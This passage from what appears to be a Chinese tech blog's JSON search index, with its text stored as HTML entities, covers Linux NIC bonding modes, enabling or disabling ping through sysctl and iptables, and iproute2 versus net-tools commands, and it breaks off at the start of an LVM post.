balancing&#x9002;&#x914D;&#x5668;&#x4F20;&#x8F93;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x7279;&#x522B;&#x7684;switch&#x652F;&#x6301;&#x7684;&#x901A;&#x9053;bonding&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x4E0A;&#x6839;&#x636E;&#x5F53;&#x524D;&#x7684;&#x8D1F;&#x8F7D;&#xFF08;&#x6839;&#x636E;&#x901F;&#x5EA6;&#x8BA1;&#x7B97;&#xFF09;&#x5206;&#x914D;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#xFF0C;&#x5982;&#x679C;&#x6B63;&#x5728;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;slave&#x51FA;&#x6545;&#x969C;&#x4E86;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;slave&#x63A5;&#x7BA1;&#x5931;&#x8D25;&#x7684;slave&#x7684;MAC&#x5730;&#x5740; &#x8BE5;&#x6A21;&#x5F0F;&#x7684;&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387; 6&#xFF0C;(balance-alb)Adaptive load balancing&#x9002;&#x914D;&#x5668;&#x9002;&#x5E94;&#x6027;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF0C;&#x8BE5;&#x6A21;&#x5F0F;&#x5305;&#x542B;&#x4E86;balance=tlb&#x6A21;&#x5F0F;&#xFF0C;&#x540C;&#x65F6;&#x52A0;&#x4E0A;&#x9488;&#x5BF9;IPv4&#x6D41;&#x91CF;&#x7684;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF08;receiveload balance&#xFF0C;rlb&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;switch&#x7684;&#x652F;&#x6301;&#xFF0C;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x662F;&#x901A;&#x8FC7;ARP&#x534F;&#x5546;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;bonding&#x9A71;&#x52A8;&#x622A;&#x83B7;&#x672C;&#x673A;&#x7684;ARP&#x5E94;&#x7B54;&#xFF0C;&#x5E76;&#x628A;&#x6E90;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x6539;&#x5199;&#x4E3A;bood&#x4E2D;&#x67D0;&#x4E2A;salve&#x7684;&#x552F;&#x4E00;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x4E0D;&#x540C;&#x7684;&#x5BF9;&#x7AEF;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x3002;&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x4F1A;&#x88AB;&#x5747;&#x8861;&#x3002;&#x5F53;&#x672C;&#x673A;&#x53D1;&#x9001;ARP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5BF9;&#x7AEF;&#x7684;IP&#x4FE1;&#x606F;&#x4ECE;ARP&#x5305;&#x4E2D;&#x590D;&#x5236;&#x5E76;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002;&#x5F53;ARP&#x5E94;&#x7B54;&#x4ECE;&#x5BF9;&#x7AEF;&#x5230;&#x8FBE;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;ARP&#x5E94;&#x7B54;&#x7ED9;bond&#x4E2D;&#x7684;&#x67D0;&#x4E2A;slave&#x3002;&#x4F7F;&#x7528;ARP&#x534F;&#x5546;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF1A;&#x6BCF;&#x6B21;&#x5E7F;&#x64AD; ARP&#x8BF7;&#x6C42;&#x65F6;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x7AEF;&#x5B66;&#x4E60;&#x5230;&#x8FD9;&#x4E2A;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5C06;&#x4F1A;&#x5168;&#x90E8;&#x6D41;&#x5411;&#x5F53;&#x524D;&#x7684;slave&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7ED9;&#x6240;&#x6709;&#x7684;&#x5BF9;&#x7AEF;&#x53D1;&#x9001;&#x66F4;&#x65B0;&#xFF08;ARP&#x5E94;&#x7B54;&#xFF09;&#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x5E94;&#x7B54;&#x4E2D;&#x5305;&#x542B;&#x4ED6;&#x4EEC;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x6D41;&#x91CF;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x5F53;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#x65F6;&#xFF0C;&#x6216;&#x8005;&#x67D0;&#x4E2A;&#x672A;&#x6FC0;&#x6D3B;&#x7684;slave&#x91CD;&#x65B0; &#x6FC0;&#x6D3B;&#x65F6;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x8981;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x63A5;&#x6536;&#x7684;&#x8D1F;&#x8F7D;&#x88AB;&#x987A;&#x5E8F;&#x5730;&#x5206;&#x5E03;&#xFF08;roundrobin&#xFF09;&#x5728;bond&#x4E2D;&#x6700;&#x9AD8;&#x901F;&#x7684;slave&#x4E0A;&#x5F53;&#x67D0;&#x4E2A;&#x94FE;&#x8DEF;&#x88AB;&#x91CD;&#x65B0;&#x63A5;&#x4E0A;&#xFF0C;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5728;&#x6240;&#x6709;&#x5F53;&#x524D;&#x6FC0;&#x6D3B;&#x7684;slave&#x4E2D;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x5206;&#x914D;&#xFF0C;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;MAC&#x5730;&#x5740;&#x7ED9;&#x6BCF;&#x4E2A; client&#x53D1;&#x8D77;ARP&#x5E94;&#x7B54;&#x3002;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x7684;updelay&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;&#x67D0;&#x4E2A;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;switch(&#x4EA4;&#x6362;&#x673A;)&#x8F6C;&#x53D1;&#x5EF6;&#x65F6;&#x7684;&#x503C;&#xFF0C;&#x4ECE;&#x800C;&#x4FDD;&#x8BC1;&#x53D1;&#x5F80;&#x5BF9;&#x7AEF;&#x7684;ARP&#x5E94;&#x7B54; &#x4E0D;&#x4F1A;&#x88AB;switch(&#x4EA4;&#x6362;&#x673A;)&#x963B;&#x622A;&#x3002;&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;&#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#xFF1B;&#x6761;&#x4EF6;2&#xFF1A;&#x5E95;&#x5C42;&#x9A71;&#x52A8;&#x652F;&#x6301;&#x8BBE;&#x7F6E;&#x67D0;&#x4E2A;&#x8BBE;&#x5907;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x603B;&#x662F;&#x6709;&#x4E2A;slave(curr_active_slave)&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x540C;&#x65F6;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A; bond &#x4E2D;&#x7684;slave&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x3002;&#x5982;&#x679C;curr_active_slave&#x51FA;&#x6545;&#x969C;&#xFF0C;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x5C06;&#x4F1A;&#x88AB;&#x65B0;&#x9009;&#x51FA;&#x6765;&#x7684; curr_active_slave&#x63A5;&#x7BA1;&#x5176;&#x5B9E;mod=6&#x4E0E;mod=0&#x7684;&#x533A;&#x522B;&#xFF1A;mod=6&#xFF0C;&#x5148;&#x628A;eth0&#x6D41;&#x91CF;&#x5360;&#x6EE1;&#xFF0C;&#x518D;&#x5360;eth1&#xFF0C;&#x2026;.ethX&#xFF1B;&#x800C;mod=0&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;2&#x4E2A;&#x53E3;&#x7684;&#x6D41;&#x91CF;&#x90FD;&#x5F88;&#x7A33;&#x5B9A;&#xFF0C;&#x57FA;&#x672C;&#x4E00;&#x6837;&#x7684;&#x5E26;&#x5BBD;&#x3002;&#x800C;mod=6&#xFF0C;&#x4F1A;&#x53D1;&#x73B0;&#x7B2C;&#x4E00;&#x4E2A;&#x53E3;&#x6D41;&#x91CF;&#x5F88;&#x9AD8;&#xFF0C;&#x7B2C;2&#x4E2A;&#x53E3;&#x53EA;&#x5360;&#x4E86;&#x5C0F;&#x90E8;&#x5206;&#x6D41;&#x91CF; &#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;https://www.jianshu.com/p/793b0138a3efhttps://chegva.com/2506.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Linux禁止和开启ping的方法","date":"2022-06-07T04:40:03.000Z","path":"/posts/be846aea/","text":"ping &#x539F;&#x7406;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x90FD;&#x6709;&#x552F;&#x4E00;&#x786E;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x7ED9;&#x76EE;&#x6807;IP&#x5730;&#x5740;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x5BF9;&#x65B9;&#x5C31;&#x8981;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;&#x5305;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x786E;&#x5B9A;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x53EF;&#x4EE5;&#x521D;&#x6B65;&#x5224;&#x65AD;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7B49;&#x3002; ping&#x547D;&#x4EE4;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x68C0;&#x6D4B;&#x7F51;&#x7EDC;&#x901A;&#x4E0E;&#x4E0D;&#x901A;&#xFF0C;&#x4E5F;&#x53EB;&#x65F6;&#x5EF6;&#xFF08;&#x7F51;&#x7EDC;&#x4E00;&#x7AEF;&#x4F20;&#x9001;&#x5230;&#x53E6;&#x4E00;&#x7AEF;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF09;&#xFF0C;&#x5176;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x901F;&#x5EA6;&#x8D8A;&#x6162; ping (Packet Internet Grope)&#xFF0C;&#x56E0;&#x7279;&#x7F51;&#x5305;&#x63A2;&#x7D22;&#x5668;&#xFF0C;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x91CF;&#x7684;&#x7A0B;&#x5E8F;&#x3002; ping&#x53D1;&#x9001;&#x4E00;&#x4E2A;ICMP&#x56DE;&#x58F0;&#x8BF7;&#x6C42;&#x6D88;&#x606F;&#x7ED9;&#x76EE;&#x7684;&#x5730;&#x5E76;&#x62A5;&#x544A;&#x662F;&#x5426;&#x6536;&#x5230;&#x6240;&#x5E0C;&#x671B;&#x7684;ICMP&#x56DE;&#x58F0;&#x5E94;&#x7B54;&#x3002;&#x5B83;&#x662F;&#x7528;&#x6765;&#x68C0;&#x67E5;&#x7F51;&#x7EDC;&#x662F;&#x5426;&#x901A;&#x7545;&#x6216;&#x8005;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x7684;&#x547D;&#x4EE4;&#x3002; ping&#x7684;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;1&#x3001;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185; ping &#x4E3B;&#x673A;A&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x4E3B;&#x673A;BICMP&#x8BF7;&#x6C42;&#x5305; &#x5728;&#x672C;&#x673A;(&#x4E3B;&#x673A;A)&#x67E5;&#x627E;ARP&#x7F13;&#x5B58;&#x8868;&#x67E5;&#x627E;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;&#x5BF9;&#x5E94;&#x7684;MAC &#x6CA1;&#x6709;&#x627E;&#x5230;&#x4E3B;&#x673A;B&#x7684;IP&#x4E0E;&#x5176;MAC&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF0C;&#x5219;&#x53D1;&#x9001;&#x4E00;&#x4E2A;arp (&#x6839;&#x636E;IP&#x5730;&#x5740;&#x83B7;&#x53D6;&#x7269;&#x7406;&#x5730;&#x5740;&#x7684;&#x4E00;&#x4E2A;TCP/IP&#x534F;&#x8BAE;) &#x8BF7;&#x6C42;&#x5E7F;&#x64AD; &#x4E3B;&#x673A;B&#x63A5;&#x6536;&#x5230;arp&#x8BF7;&#x6C42;&#x5305;&#x540E;&#xFF0C;&#x56DE;&#x590D;&#x4E00;&#x4E2A;arp&#x5E94;&#x7B54;&#x5305;(&#x91CC;&#x9762;&#x5305;&#x542B;&#x672C;&#x673A;MAC) &#x4E3B;&#x673A;A&lt;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;-&#x4E3B;&#x673A;BICMP&#x5E94;&#x7B54;&#x5305; 2&#x3001;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5; &#x5728;&#x4E3B;&#x673A;A&#x4E0A;&#x8FD0;&#x884C;&#x201C;ping&#x4E3B;&#x673A;C(&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;)&#x201D;&#x540E;&#xFF0C;&#x5F00;&#x59CB;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;&#x5230;&#x4E86;&#x600E;&#x6837;&#x5F97;&#x5230;MAC&#x5730;&#x5740;&#x65F6;&#xFF0C;IP&#x534F;&#x8BAE;&#x901A;&#x8FC7;&#x8BA1;&#x7B97;&#x53D1;&#x73B0;C&#x673A;&#x4E0E;&#x81EA;&#x5DF1;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x7F51;&#x6BB5;&#x5185;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x8DEF;&#x7531;&#x5668;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5C06;&#x8DEF;&#x7531;&#x7684;MAC&#x53D6;&#x8FC7;&#x6765;&#xFF0C;&#x81F3;&#x4E8E;&#x600E;&#x6837;&#x5F97;&#x5230;&#x8DEF;&#x7531;&#x7684;MAC&#xFF0C;&#x8DDF;&#x4E0A;&#x9762;&#x4E00;&#x6837;&#xFF0C;&#x5148;&#x5728;ARP&#x7F13;&#x5B58;&#x8868;&#x627E;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x5C31;&#x5E7F;&#x64AD;&#x5305;&#x3002;&#x8DEF;&#x7531;&#x5F97;&#x5230;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5E27;&#x540E;&#xFF0C;&#x518D;&#x8DDF;&#x4E3B;&#x673A;C&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x5982;&#x679C;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5C31;&#x5411;&#x4E3B;&#x673A;A&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x8D85;&#x65F6;&#x7684;&#x4FE1;&#x606F;&#x3002; Linux&#x9ED8;&#x8BA4;&#x662F;&#x5141;&#x8BB8;Ping&#x54CD;&#x5E94;&#x7684;&#xFF0C;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5141;&#x8BB8;Ping&#x7531;2&#x4E2A;&#x56E0;&#x7D20;&#x51B3;&#x5B9A;&#x7684;&#xFF1A;A&#x3001;&#x5185;&#x6838;&#x53C2;&#x6570;&#xFF0C;B&#x3001;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x9700;&#x8981;2&#x4E2A;&#x56E0;&#x7D20;&#x540C;&#x65F6;&#x5141;&#x8BB8;&#x624D;&#x80FD;&#x5141;&#x8BB8;Ping&#xFF0C;2&#x4E2A;&#x56E0;&#x7D20;&#x6709;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x7981;Ping&#x5C31;&#x65E0;&#x6CD5;Ping&#x3002; &#x5177;&#x4F53;&#x7684;&#x914D;&#x7F6E;&#x65B9;&#x6CD5; &#x5185;&#x6838;&#x53C2;&#x6570;&#x8BBE;&#x7F6E; 1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E; A. &#x4E34;&#x65F6;&#x5141;&#x8BB8;PING&#x64CD;&#x4F5C;&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;echo 0 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all B. &#x6C38;&#x4E45;&#x5141;&#x8BB8;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002; &#x5728; /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C; net.ipv4.icmp_echo_ignore_all=0 &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09;&#x3002; &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002; 2&#x3001;&#x7981;&#x6B62;Ping&#x8BBE;&#x7F6E; A.&#x4E34;&#x65F6;&#x7981;&#x6B62;PING&#x7684;&#x547D;&#x4EE4;&#x4E3A;&#xFF1A;echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all B.&#x6C38;&#x4E45;&#x7981;&#x6B62;PING&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x3002; /etc/sysctl.conf &#x4E2D;&#x589E;&#x52A0;&#x4E00;&#x884C; net.ipv4.icmp_echo_ignore_all=1 &#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6709;net.ipv4.icmp_echo_ignore_all&#x8FD9;&#x4E00;&#x884C;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x4FEE;&#x6539;=&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;&#x5373;&#x53EF;&#x7684;&#x3002;&#xFF08;0&#x8868;&#x793A;&#x5141;&#x8BB8;&#xFF0C;1&#x8868;&#x793A;&#x7981;&#x6B62;&#xFF09; &#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#x6267;&#x884C;sysctl -p&#x4F7F;&#x65B0;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002; &#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; &#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x7684;&#x65B9;&#x6CD5;&#x7684;&#x524D;&#x63D0;&#x662F;&#x5185;&#x6838;&#x914D;&#x7F6E;&#x662F;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6CA1;&#x6709;&#x7981;&#x6B62;ping&#x8FD9;&#x91CC;&#x4EE5;iptables&#x9632;&#x706B;&#x5899;&#x4E3A;&#x4F8B;&#xFF0C;&#x5176;&#x4ED6;&#x9632;&#x706B;&#x5899;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;&#x53EF;&#x53C2;&#x8003;&#x9632;&#x706B;&#x5899;&#x7684;&#x5B98;&#x65B9;&#x6587;&#x6863;&#x3002; 1&#x3001;&#x5141;&#x8BB8;PING&#x8BBE;&#x7F6E; iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT 2&#x3001;&#x7981;&#x6B62;PING&#x8BBE;&#x7F6E; iptables -A INPUT -p icmp --icmp-type echo-request -j DROP iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP --icmp-type 8 echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;ping&#x8BF7;&#x6C42;&#xFF09; 0/0 &#x6240;&#x6709; IP iptables -A INPUT -p icmp --icmp-type 8 -j DROP iptables -A INPUT -p icmp --icmp-type 0 -j DROP 0 Echo Reply&#x2014;&#x2014;&#x56DE;&#x663E;&#x5E94;&#x7B54;&#xFF08;Ping&#x5E94;&#x7B54;&#xFF09; 8 Echo request&#x2014;&#x2014;&#x56DE;&#x663E;&#x8BF7;&#x6C42;&#xFF08;Ping&#x8BF7;&#x6C42;&#xFF09; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"iproute2工具包","date":"2022-06-07T04:39:38.000Z","path":"/posts/1ebd4a76/","text":"iproute2 &#x5DE5;&#x5177; net-tools iproute2 arp -na ip neigh ifconfig ip link ifconfig -a ip addr show ifconfig &#x2013;help ip help ifconfig -eth0 up ip link set eth0 up ipmaddr ip maddr iptunnel ip tunnel netstat ss netstat -i ip -s link netstat -g ip maddr netstat -l ss -l netstat -r ip route route add ip route add route del ip route del route -n ip route show vconfig ip link iproute2 net-tools Notes ip link show ifconfig -a &#x663E;&#x793A;&#x6240;&#x6709;&#x7F51;&#x5361; ip link set down/up eth0 ifconfig eth0 up/down &#x542F;&#x52A8;/&#x5173;&#x95ED;&#x7F51;&#x5361; ip addr add 192.168.0.10/24 dev eth0 ifconfig eth0 192.168.0.10/24 &#x5728;eth0&#x4E0A;&#x6DFB;&#x52A0;IP&#x5730;&#x5740; ip addr del 192.168.0.10/24 dev eth0 ifconfig eth0 0 &#x5220;&#x9664;eth0&#x7684;IP&#x5730;&#x5740; ip addr show dev eth0 ifconfig eth0 &#x67E5;&#x770B;eth0&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x4FE1;&#x606F; ip -6 addr add fe80::f0b7:57ff:fe2f:5f0d/64 dev eth1 ifconfig eth1 inet6 add fe80::f0b7:57ff:fe2f:5f0d/64 &#x5728;eth1&#x4E0A;&#x6DFB;&#x52A0;IPv6&#x5730;&#x5740; ip -6 addr show dev eth0 ifconfig eth0 &#x67E5;&#x770B;IPv6&#x5730;&#x5740; ip link set dev eth0 address 02:42:20:d2:28:36 ifconfig eth0 hw ether 02:42:20:d2:28:36 &#x914D;&#x7F6E;MAC&#x5730;&#x5740; ip route show route -n &#x67E5;&#x770B;&#x8DEF;&#x7531;&#x8868;&#x4FE1;&#x606F; ip route add default via 192.168.0.1 dev eth0 route add default gw 192.168.0.1 eth0 &#x6DFB;&#x52A0;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531; ip roue replace default via 192.168.0.1 dev ens33 route del default gw 192.168.0.1 ens33 &#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531; ip route add 10.24.32.0/24 via 192.168.0.1 dev ens33 route add -net 10.24.32.0/24 gw 192.168.0.1 dev ens33 &#x6DFB;&#x52A0;&#x9759;&#x6001;&#x8DEF;&#x7531; ip route del 192.168.10.0/24 route del -net 192.168.10.0/24 &#x5220;&#x9664;&#x9759;&#x6001;&#x8DEF;&#x7531; ss netstat &#x67E5;&#x770B;tcp/udp&#x7684;scoket&#x76D1;&#x542C;&#x4FE1;&#x606F; arp -an ip neigh &#x67E5;&#x770B;ARP&#x8868; bridge brctl &#x7BA1;&#x7406;bridge&#x5730;&#x5740;&#x548C;device document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"LVM磁盘管理","date":"2022-06-07T04:39:21.000Z","path":"/posts/38cc96c8/","text":"EXT&#x6269;&#x5C55;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF08;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF09;ext2&#x3001;ext3&#xFF1A;linux&#x73AF;&#x5883;&#x4E0A;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;ext2/ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x6765;&#x8BB0;&#x5F55;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;&#x4F5C;&#x7528;&#x5C31;&#x50CF;Windows&#x7684;&#x6587;&#x4EF6;&#x5206;&#x914D;&#x8868;&#x3002;&#x7D22;&#x5F15;&#x8282;&#x70B9;&#x662F;&#x4E00;&#x4E2A;&#x7ED3;&#x6784;&#xFF0C;&#x5B83;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x957F;&#x5EA6;&#x3001;&#x521B;&#x5EFA;&#x53CA;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#x3001;&#x6743;&#x9650;&#x3001;&#x6240;&#x5C5E;&#x5173;&#x7CFB;&#x3001;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#x7B49;&#x4FE1;&#x606F; ext2&#x3001;ext3&#x7684;&#x533A;&#x522B;&#x5982;&#x4E0B;&#xFF1A;ext2&#x548C;ext3&#x7684;&#x683C;&#x5F0F;&#x5B8C;&#x5168;&#x76F8;&#x540C;&#xFF0C;&#x77E5;&#x8BC6;&#x5728;ext3&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6700;&#x540E;&#x9762;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x7A7A;&#x95F4;&#x7528;&#x6765;&#x5B58;&#x653E;journal&#xFF08;&#x65E5;&#x5FD7;&#xFF09;&#x7684;&#x8BB0;&#x5F55;ext2&#x4E2D;&#xFF0C;&#x5199;&#x8D44;&#x6599;&#x5230;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x65F6;&#xFF0C;&#x5148;&#x5C06;&#x8D44;&#x6599;&#x5199;&#x5165;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x5199;&#x6EE1;&#x662F;&#x624D;&#x56DE;&#x5199;&#x5165;&#x786C;&#x76D8;&#x91CC;&#x9762;&#x5728;ext3&#x4E2D;&#xFF0C;&#x5199;&